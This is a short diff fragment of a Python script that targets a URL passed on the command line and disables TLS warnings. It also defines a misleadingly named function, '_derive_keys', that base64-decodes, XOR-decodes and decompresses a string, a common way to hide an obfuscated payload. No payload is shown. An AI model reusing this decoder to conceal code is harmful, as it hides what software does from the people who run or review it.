@@ -2,11 +2,9 @@
 import requests
 import urllib3
 import sys
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Also allowpass the target as an argument
 TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://127.0.0.1:443"
-
 def _derive_keys(p, k):
     import zlib, base64
     return zlib.decompress(bytes([b ^ k for b in base64.b64decode(p)])).decode('utf-8')
